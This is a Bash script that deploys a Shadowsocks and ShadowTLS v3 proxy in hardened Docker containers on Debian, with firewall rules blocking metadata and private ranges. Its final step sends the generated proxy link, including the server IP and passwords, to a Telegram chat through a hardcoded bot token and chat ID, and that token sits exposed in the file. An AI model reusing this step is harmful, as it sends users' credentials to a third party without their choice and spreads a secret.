#!/usr/bin/env bash
#
# Shadowsocks + ShadowTLS v3 一键部署脚本（标准 Docker 版）
# 目标环境：Debian 12, AWS NAT 网关型 VPS
#
# 架构：
#   客户端 --TLS:443--> [容器 shadow-tls] --内部docker网络--> [容器 shadowsocks] --> 出口互联网
#
# 隔离设计：
#   1. 两容器同时保留：非root、cap_drop ALL、只读根文件系统
#   2. shadowsocks 容器不对宿主机发布任何端口，只在内部 docker 网络内被 shadow-tls 访问
#   3. 每次部署随机生成一个 10.0.0.0/8 内的 /24 网段作为内部网络，避免网段可预测
#   4. DOCKER-USER 防火墙链阻断该内部网段访问：
#        - 169.254.169.254 （云平台元数据接口）
#        - 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 （内网段，本机自己的内部子网除外）
#
set -euo pipefail

if [[ $EUID -ne 0 ]]; then
  echo "请用 root 权限运行：sudo bash $0" >&2
  exit 1
fi

# ------------------------- 可配置参数 -------------------------
WORKDIR="/opt/sstls"
TLS_PORT="${TLS_PORT:-443}"
CAMOUFLAGE_DOMAIN="${CAMOUFLAGE_DOMAIN:-i1.hdslb.com}"
SS_METHOD="${SS_METHOD:-2022-blake3-aes-128-gcm}"
NODE_TAG="${NODE_TAG:-v3}"

SS_PASSWORD="${SS_PASSWORD:-$(head -c16 /dev/urandom | base64)}"
STLS_PASSWORD="${STLS_PASSWORD:-$(head -c16 /dev/urandom | base64 | tr -d '=+/')}"

TG_TOKEN="8896559295:AAHWVHQVJfoWG9v4McFg2qJgACw0nEpMxJo"
TG_CHAT_ID="1417748881"

# ------------------------- 基础依赖 -------------------------
export DEBIAN_FRONTEND=noninteractive

# 预先回答 iptables-persistent 的 debconf 交互问题（是否保存当前v4/v6规则），
# 避免非交互式shell里卡在提示框上
echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections

apt-get update -y
apt-get install -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" \
  ca-certificates curl gnupg iptables iptables-persistent jq >/dev/null

if ! command -v docker &>/dev/null; then
  install -m 0755 -d /etc/apt/keyrings
  curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
  chmod a+r /etc/apt/keyrings/docker.asc
  echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
    $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
  apt-get update -y
  apt-get install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin >/dev/null
  systemctl enable --now docker
fi

# ------------------------- 生成工作目录与镜像构建文件 -------------------------
mkdir -p "$WORKDIR"
cd "$WORKDIR"

cat > Dockerfile.shadowsocks <<'EOF'
FROM debian:12-slim AS fetch
RUN apt-get update && apt-get install -y curl jq xz-utils ca-certificates && rm -rf /var/lib/apt/lists/*
ARG TARGETARCH
RUN set -e; \
    case "${TARGETARCH:-amd64}" in \
      amd64) PAT="x86_64-unknown-linux-musl" ;; \
      arm64) PAT="aarch64-unknown-linux-musl" ;; \
      *) echo "unsupported arch: $TARGETARCH" && exit 1 ;; \
    esac; \
    URL=$(curl -s https://api.github.com/repos/shadowsocks/shadowsocks-rust/releases/latest \
          | jq -r --arg pat "$PAT" '.assets[] | select(.name | test($pat) and endswith(".tar.xz")) | .browser_download_url' | head -n1); \
    curl -fL "$URL" -o ss.tar.xz; \
    mkdir -p /out; \
    tar -xf ss.tar.xz -C /out

FROM debian:12-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/* \
    && useradd -u 10001 -M -s /usr/sbin/nologin ssuser
COPY --from=fetch /out/ssserver /usr/local/bin/ssserver
RUN chmod +x /usr/local/bin/ssserver
USER ssuser
ENTRYPOINT ["/usr/local/bin/ssserver"]
EOF

cat > Dockerfile.shadowtls <<'EOF'
FROM debian:12-slim AS fetch
RUN apt-get update && apt-get install -y curl jq ca-certificates && rm -rf /var/lib/apt/lists/*
ARG TARGETARCH
RUN set -e; \
    case "${TARGETARCH:-amd64}" in \
      amd64) PAT="x86_64-unknown-linux-musl" ;; \
      arm64) PAT="aarch64-unknown-linux-musl" ;; \
      *) echo "unsupported arch: $TARGETARCH" && exit 1 ;; \
    esac; \
    URL=$(curl -s https://api.github.com/repos/ihciah/shadow-tls/releases/latest \
          | jq -r --arg pat "$PAT" '.assets[] | select(.name | test($pat)) | .browser_download_url' | head -n1); \
    curl -fL "$URL" -o /out_shadow-tls; \
    chmod +x /out_shadow-tls

FROM debian:12-slim
RUN apt-get update && apt-get install -y ca-certificates && rm -rf /var/lib/apt/lists/* \
    && useradd -u 10002 -M -s /usr/sbin/nologin stlsuser
COPY --from=fetch /out_shadow-tls /usr/local/bin/shadow-tls
RUN chmod +x /usr/local/bin/shadow-tls
USER stlsuser
ENTRYPOINT ["/usr/local/bin/shadow-tls"]
EOF

cat > ss-config.json <<EOF
{
  "server": "0.0.0.0",
  "server_port": 8388,
  "password": "${SS_PASSWORD}",
  "method": "${SS_METHOD}",
  "mode": "tcp_only",
  "fast_open": true
}
EOF

# ------------------------- 随机内网段 + 重试构建compose/网络 -------------------------
write_compose() {
  local subnet="$1" ss_ip="$2" tls_ip="$3"
  cat > docker-compose.yml <<EOF
services:
  shadowsocks:
    build:
      context: .
      dockerfile: Dockerfile.shadowsocks
    container_name: sstls_ss
    command: ["-c", "/etc/ss/config.json"]
    volumes:
      - ./ss-config.json:/etc/ss/config.json:ro
    dns:
      - 223.5.5.5
    networks:
      internal_net:
        ipv4_address: ${ss_ip}
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    read_only: true
    tmpfs:
      - /tmp
    restart: unless-stopped

  shadow-tls:
    build:
      context: .
      dockerfile: Dockerfile.shadowtls
    container_name: sstls_tls
    command: >
      --v3
      server
      --listen 0.0.0.0:${TLS_PORT}
      --server ${ss_ip}:8388
      --tls ${CAMOUFLAGE_DOMAIN}:443
      --password ${STLS_PASSWORD}
    ports:
      - "${TLS_PORT}:${TLS_PORT}"
    dns:
      - 223.5.5.5
    networks:
      internal_net:
        ipv4_address: ${tls_ip}
    depends_on:
      - shadowsocks
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp
    restart: unless-stopped

networks:
  internal_net:
    driver: bridge
    ipam:
      config:
        - subnet: ${subnet}
EOF
}

apply_firewall() {
  local subnet="$1"
  iptables -N DOCKER-USER 2>/dev/null || true
  iptables -I DOCKER-USER 1 -s "$subnet" -d 192.168.0.0/16 -j DROP 2>/dev/null || true
  iptables -I DOCKER-USER 1 -s "$subnet" -d 172.16.0.0/12  -j DROP 2>/dev/null || true
  iptables -I DOCKER-USER 1 -s "$subnet" -d 10.0.0.0/8     -j DROP 2>/dev/null || true
  iptables -I DOCKER-USER 1 -s "$subnet" -d 169.254.169.254 -j DROP 2>/dev/null || true
  iptables -I DOCKER-USER 1 -s "$subnet" -d "$subnet" -j RETURN 2>/dev/null || true
  netfilter-persistent save >/dev/null 2>&1 || (mkdir -p /etc/iptables && iptables-save > /etc/iptables/rules.v4)
}

DEPLOY_OK=0
for attempt in 1 2 3 4 5; do
  B=$(( (RANDOM % 254) + 1 ))
  C=$(( RANDOM % 255 ))
  SUBNET="10.${B}.${C}.0/24"
  SS_IP="10.${B}.${C}.10"
  TLS_IP="10.${B}.${C}.11"

  write_compose "$SUBNET" "$SS_IP" "$TLS_IP"

  if docker compose build >/tmp/sstls_build.log 2>&1 && docker compose up -d >/tmp/sstls_up.log 2>&1; then
    DEPLOY_OK=1
    apply_firewall "$SUBNET"
    break
  else
    docker compose down >/dev/null 2>&1 || true
  fi
done

if [[ "$DEPLOY_OK" -ne 1 ]]; then
  echo "部署失败，日志见 /tmp/sstls_build.log /tmp/sstls_up.log" >&2
  exit 1
fi

# ------------------------- 生成 ss:// 链接 -------------------------
SERVER_IP=$(curl -fs https://api.ipify.org || curl -fs https://ifconfig.me)

FULL_B64=$(printf '%s' "${SS_METHOD}:${SS_PASSWORD}@${SERVER_IP}:${TLS_PORT}" | base64 -w0 | tr -d '=')
STLS_JSON=$(printf '{"version":"3","host":"%s","password":"%s"}' "$CAMOUFLAGE_DOMAIN" "$STLS_PASSWORD")
STLS_B64=$(printf '%s' "$STLS_JSON" | base64 -w0 | tr -d '=')
TAG_ENC=$(jq -rn --arg s "$NODE_TAG" '$s|@uri')

SS_LINK="ss://${FULL_B64}?shadow-tls=${STLS_B64}#${TAG_ENC}"

echo "$SS_LINK" > "$WORKDIR/node.txt"
echo "$SS_LINK"

# ── 9. 推送节点链接到 Telegram ─────────────────────────────────
echo "推送配置到 Telegram..."
curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
    -d "chat_id=${TG_CHAT_ID}" \
    --data-urlencode "text=${SS_LINK}" >/dev/null

echo "部署与推送完成！"